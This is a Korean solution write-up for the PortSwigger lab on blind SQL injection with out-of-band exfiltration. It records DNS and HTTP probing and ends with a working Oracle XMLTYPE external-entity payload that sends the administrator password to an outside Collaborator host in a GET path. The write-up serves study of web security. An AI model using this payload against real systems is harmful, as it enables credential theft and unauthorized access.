---
title: "Blind SQL injection with out-of-band data exfiltration"
tags:
  - portswigger
  - sql-injection
lab_url: "https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration"
difficulty: Practitioner
note_kind: solution
draft: false
---

# Blind SQL injection with out-of-band data exfiltration

## 문제 조건과 설명

추적 쿠키의 값이 비동기 SQL 조회에 들어간다. 조회 결과는 애플리케이션 응답에 표시되지 않으며, 비동기 처리 때문에 페이지의 응답을 비교하는 방법만으로는 SQL 결과를 읽을 수 없다. 공식 설명은 주입된 조회로 외부 도메인과 상호작용할 수 있다고 알려 준다.

**16번과 이번 문제의 차이**

앞선 out-of-band 실습은 **DNS 조회가 발생했는지**를 확인하는 것이 완료 조건이었다. 이번에는 그 통신 경로를 이용해 **데이터베이스 안의 값 자체를 알아내야 한다.** SQL 실행의 흔적만 남기는 것과 관리자 비밀번호를 외부 이벤트에서 식별 가능한 형태로 전달하는 것은 서로 다른 단계다.

공식 설명은 `users` 테이블과 `username`, `password` 열이 존재한다고 알려 준다. `administrator`의 실제 비밀번호는 주어지지 않는다. **완료 조건은 그 값을 외부 상호작용으로 확인한 뒤 관리자 계정으로 로그인하는 것**이다. DNS 이벤트 하나를 확인했더라도 그 이벤트에 비밀번호가 포함되지 않았다면 목표를 달성한 것이 아니다.

**탐색에서 확인할 순서와 제약**

먼저 보낸 쿠키 요청과 짝을 지을 수 있는 외부 이벤트가 실제로 도착하는지 확인해야 한다. 그다음 계정 조회에서 얻으려는 값을 외부 요청의 식별 가능한 부분에 담을 수 있는지 살펴보고, 수신 기록에서 읽은 값을 로그인으로 검증해야 한다. 데이터가 DNS 이름에 들어간다면 허용되는 문자와 길이 때문에 표현 방법도 확인해야 한다. 어떤 SQL 구문과 인코딩이 통하는지는 문제 설명만으로 확정할 수 없다.

공식 주의 문구에 따라 Academy 방화벽은 임의의 외부 시스템으로 가는 상호작용을 차단하므로, **Burp Collaborator의 기본 공개 서버를 사용해야 한다.** 외부 이벤트가 없을 때는 이 환경 제약을 먼저 고려해야 한다. 아래에는 직접 확인한 이벤트와 계정 값만 기록한다.

출처: [PortSwigger 실습 설명](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

## 탐색 및 풀이 기록

### 초기 관찰

새 실습 인스턴스의 첫 화면 요청에서 `TrackingId` 쿠키를 받았다. 이 값을 SQL 식으로 바꿔 보내도 웹 응답은 HTTP 200이어서, 결과는 같은 비밀값(BIID)으로 만든 Collaborator 주소의 **수신 기록**에서 확인했다. 아래 예시의 `<원래 TrackingId>`와 `<고유값>`은 각각 인스턴스 쿠키와 직접 생성한 Collaborator 식별자를 뜻한다.

먼저 쿠키 값에 `UTL_INADDR.GET_HOST_ADDRESS('<고유값>.oastify.com')`를 연결하자 해당 주소의 DNS 이벤트 2건이 도착했다. 주입된 SQL이 실행되고 수신 기록을 읽을 수 있음을 확인한 대조 시험이다. [Oracle `UTL_INADDR` 문서](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_INADDR.html)

### 실행 과정

처음에는 관리자 비밀번호를 HTTP POST 본문에 넣는 방법을 검토하며 무해한 본문으로 시험했다. 로컬에서 Collaborator 주소로 직접 보낸 `POST /probe`와 본문 `probe=ping`은 정상적으로 기록됐다. 반면 **실습의 쿠키 주입을 통한** `UTL_HTTP.REQUEST` GET, 임시 PL/SQL 함수의 `UTL_HTTP.BEGIN_REQUEST(..., 'POST')`, `APEX_WEB_SERVICE.MAKE_REST_REQUEST(..., 'POST')` 시도에는 외부 이벤트가 없었다. 같은 입력 지점에서 `UTL_INADDR`의 DNS 이벤트와 `XMLTYPE`의 HTTP GET은 도착했으므로, 단순히 외부 HTTP 연결 전체가 차단됐다고 볼 수는 없다.

추가 확인에서 `ALL_OBJECTS`를 조건으로 건 DNS 시험은 접근 가능한 `UTL_INADDR` 패키지에서 참이었고, `UTL_HTTP` 패키지에서는 거짓이었다. `ALL_OBJECTS`는 현재 계정에서 접근할 수 있는 객체를 보여 준다. 이 결과는 `UTL_HTTP`를 쓸 수 없는 이유를 좁혀 주지만, 패키지 부재와 권한 부족 중 어느 쪽인지는 오류가 숨겨진 이 실습에서 확정하지 못했다. [Oracle `ALL_OBJECTS` 문서](https://docs.oracle.com/en/database/oracle/oracle-database/21/refrn/ALL_OBJECTS.html)

다음으로 `XMLTYPE`의 외부 엔터티에 `http://<고유값>.oastify.com/xml-probe`를 넣었다. Collaborator에서 DNS 이벤트 4건과 **`GET /xml-probe HTTP/1.0`** 요청이 확인됐다. 이 경로라면 데이터베이스에서 읽은 값을 외부 GET 요청에 실을 수 있었다.

처음 시도한 `?password=` 쿼리 문자열은 이 경로의 수신 요청에서 빠졌다. 고정값 `?password=probe`와 SQL로 연결한 값을 모두 시험했지만 수신 기록에는 `GET /collect HTTP/1.0`만 남았다. 반면 같은 Collaborator 서버로 로컬에서 직접 보낸 GET에는 `GET /collect?password=probe HTTP/1.1`이 기록됐다. 따라서 이 실습에서 확인된 `XMLTYPE` 요청 방식에는 쿼리 문자열 대신 **URL 경로**를 사용했다.

~~~sql fragment
<원래 TrackingId>'||(SELECT EXTRACTVALUE(XMLTYPE(
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://<고유값>.oastify.com/collect/' ||
  (SELECT password FROM users WHERE username='administrator') ||
  '"> %remote;]>'
), '/l') FROM dual)||'
~~~

이 SQL 식을 URL 인코딩해 `TrackingId` 쿠키에 넣고 첫 화면을 요청했다. `XMLTYPE`이 외부 엔터티를 읽는 과정에서 HTTP GET이 발생한다. 수신 기록의 `data.request`는 Base64로 인코딩돼 있으므로 이를 디코딩해 요청 첫 줄을 확인했다. [PortSwigger SQL 인젝션 치트시트](https://portswigger.net/web-security/sql-injection/cheat-sheet)

~~~text
GET /collect/4ujsjiyrvyp56isbv4h9 HTTP/1.0
~~~

이 인스턴스에서 경로 뒤에 붙은 `4ujsjiyrvyp56isbv4h9`가 `administrator`의 비밀번호였다.

## 최종 결과

수신한 비밀번호로 `administrator` 계정에 로그인하자 계정 화면과 `Congratulations, you solved the lab!` 배너가 표시됐다.

![administrator 로그인 후 실습 완료 화면](images/lab-out-of-band-data-exfiltration/01-administrator-solved.png)

## 배운 점

DNS 조회나 무의미한 HTTP 요청을 발생시키는 것은 **외부 통신이 가능함을 확인하는 단계**다. 데이터 유출을 확인하려면 실제 데이터가 수신 이벤트의 호스트 이름, 경로 또는 다른 기록 가능한 부분에 있어야 한다. 이번에는 POST를 만들려는 시도보다 이미 수신된 `XMLTYPE` GET의 경로에 값을 연결하는 편이 효과적이었다. 쿼리 문자열이 이 경로에서 빠지는 현상은 고정값과 직접 보낸 GET을 대조해 확인했다. 실습 인스턴스마다 비밀번호는 달라지므로 기록된 값은 이 인스턴스에 한정된다.

## 관련 개념

- [Burp Collaborator 공개 서버용 CLI 클라이언트 구현](../../concepts/burp-collaborator-cli-client.md)
- [SQL 기초와 SQL 인젝션이 생기는 원리](../../concepts/sql-injection-foundations.md)
